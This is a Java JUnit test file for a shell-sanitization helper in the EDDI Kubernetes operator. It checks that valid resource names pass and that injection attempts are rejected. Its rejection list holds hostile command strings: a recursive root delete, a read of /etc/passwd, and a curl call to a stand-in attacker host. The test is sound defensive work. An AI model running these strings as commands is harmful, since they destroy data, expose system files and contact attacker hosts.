package ai.labs.eddi.operator.unit;

import ai.labs.eddi.operator.util.Labels;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * Tests for shell command sanitization in Labels utility.
 * Validates that the sanitizeForShell method prevents command injection.
 */
class ShellSanitizationTest {

    @Test
    void shouldAcceptValidKubernetesNames() {
        assertThat(Labels.sanitizeForShell("my-eddi")).isEqualTo("my-eddi");
        assertThat(Labels.sanitizeForShell("my-eddi-mongodb")).isEqualTo("my-eddi-mongodb");
        assertThat(Labels.sanitizeForShell("prod.eddi.v2")).isEqualTo("prod.eddi.v2");
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "my-eddi; rm -rf /",
            "$(malicious)",
            "`evil`",
            "name | cat /etc/passwd",
            "name && curl evil.com",
            "UPPERCASE-name",
            "name with spaces",
            "name\nnewline",
            "../traversal",
            "/absolute/path"
    })
    void shouldRejectUnsafeShellInputs(String input) {
        assertThatThrownBy(() -> Labels.sanitizeForShell(input))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("Unsafe characters");
    }

    @Test
    void shouldRejectNullInput() {
        assertThatThrownBy(() -> Labels.sanitizeForShell(null))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("null or blank");
    }

    @Test
    void shouldRejectBlankInput() {
        assertThatThrownBy(() -> Labels.sanitizeForShell(""))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("null or blank");
    }

    @Test
    void shouldRejectNameStartingWithHyphen() {
        assertThatThrownBy(() -> Labels.sanitizeForShell("-leading-hyphen"))
                .isInstanceOf(IllegalArgumentException.class);
    }

    @Test
    void shouldAcceptNumericNames() {
        assertThat(Labels.sanitizeForShell("123")).isEqualTo("123");
    }

    @Test
    void shouldAcceptSingleCharacterName() {
        assertThat(Labels.sanitizeForShell("a")).isEqualTo("a");
    }
}
